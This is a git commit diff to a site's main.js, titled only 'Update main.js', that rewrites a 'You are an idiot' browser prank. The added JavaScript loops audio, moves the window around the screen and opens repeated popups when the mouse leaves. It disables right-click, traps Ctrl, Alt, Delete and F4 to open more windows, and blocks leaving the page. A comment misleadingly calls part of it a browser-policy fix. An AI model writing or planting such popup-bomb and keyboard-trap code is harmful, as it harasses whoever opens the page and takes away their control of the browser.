09e85c4f7caeb5a17a73dcc67a97de453a3e02fb
authenticationservice <144920677+authenticationservice@users.noreply.github.com>
2025-02-13 12:38:39 -0600

    Update main.js

--- site/js/main.js
+++ site/js/main.js
@@ -1,72 +1,141 @@
-if (top.location != location) {
-  top.location.href = location.href;
+/* [Oct 2021] Added to comply with strict browser policies. */
+document.addEventListener('click', musicPlay);
+
+function musicPlay() {
+    var audio = document.getElementById('youare-audio');
+	var micon = document.getElementById('youare-micon');
+	
+	micon.addEventListener('click', musicPlay);
+	
+	if (audio.duration > 0 && audio.paused) {
+		audio.play();
+		micon.src = "images/speaker.png";
+	}
+	else {
+		audio.pause();
+		audio.currentTime = 0;
+		
+		micon.src = "images/speakerm.png";
+	}
+	
+	document.removeEventListener('click', musicPlay);
 }
-function reopen() {
-  window.open(
-    "popup.html",
-    "",
-    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
-  );
+
+var faudio = new Audio('youare.mp3')
+
+faudio.addEventListener('timeupdate', function() {
+	console.log('TimeUpdate invoked.');
+
+    if (this.currentTime > this.duration - .45) {
+        this.currentTime = 0;
+        this.play();
+    }
 }
-function spam() {
-  for (var i = 0; i < 10; i++) {
-    reopen();
-  }
-  return "You are an idiot!";
+);
+/* [Oct 2021] End part. */
+
+function bookmark() {
+	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
+		var url = "lol.html";
+		var title = "Idiot!";
+		
+		window.external.AddFavorite(url, title);
+	}
 }
-function init() {
-  document.body.onclick = reopen;
-  document.body.onmouseover = reopen;
-  document.body.onmousemove = reopen;
-  window.onunload = spam;
-  window.onbeforeunload = spam;
-  playBall();
-  if (bookmark) {
-    bookmark();
-  }
-  reopen();
-  setTimeout(function () {
-    window.close();
-  }, 10000);
+
+var xOff = 5;
+var yOff = 5;
+var xPos = 400;
+var yPos = -100;
+var flagRun = 1;
+
+function changeTitle(title) {
+	document.title = title;
 }
-var xOff = 5,
-  yOff = 5,
-  xPos = 400,
-  yPos = -100,
-  flagRun = true;
+
+function openWindow(url) {
+	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+}
+
+function proCreate() {	
+	for (var i = 0; i < 5; i++) {
+		openWindow('lol.html');
+	}
+}
+
 function newXlt() {
-  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
-  window.focus();
+	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
 }
+
 function newXrt() {
-  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
+	window.focus();
 }
+
 function newYup() {
-  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
 }
+
 function newYdn() {
-  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+	window.focus();
 }
-function fOff() {
-  flagrun = false;
+
+function fOff(){
+	flagRun = 0;
 }
+
 function playBall() {
-  xPos += xOff;
-  yPos += yOff;
-  if (xPos > screen.width - 175) {
-    newXlt();
-  }
-  if (xPos < 0) {
-    newXrt();
-  }
-  if (yPos > screen.height - 100) {
-    newYup();
-  }
-  if (yPos < 0) {
-    newYdn();
-  }
-  if (flagRun) {
-    window.moveTo(xPos, yPos);
-    setTimeout(playBall, 1);
-  }
+    xPos += xOff;
+    yPos += yOff;
+    
+	if (xPos > screen.width - 357) newXlt();    
+	if (xPos < 0) newXrt();
+    
+	if (yPos > screen.height - 330) newYup(); 		
+	if (yPos < 0) newYdn();
+    
+	if (flagRun == 1) {
+        window.moveTo(xPos, yPos);
+        setTimeout('playBall()', 1);
+    }
 }
+
+/* [Oct 2021] Better code. */
+window.onload = function () {
+	flagRun = 1;
+	
+	playBall();
+	bookmark(); // Internet Explorer only (what a piece of shit)
+	
+	return true;
+}
+
+window.onmouseout = function () {
+	proCreate();
+
+	return null;
+};
+
+window.oncontextmenu = function() {
+	
+	return false;
+}
+
+window.onkeydown = function() {	
+	var keyCode = event.keyCode;
+	
+	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
+		alert("You are an idiot!"); 
+		proCreate();
+	}
+	
+	return null;
+}
+
+window.onbeforeunload = function() {
+    return "Are you an idiot?";
+};
+/* [Oct 2021] End of amendments. */
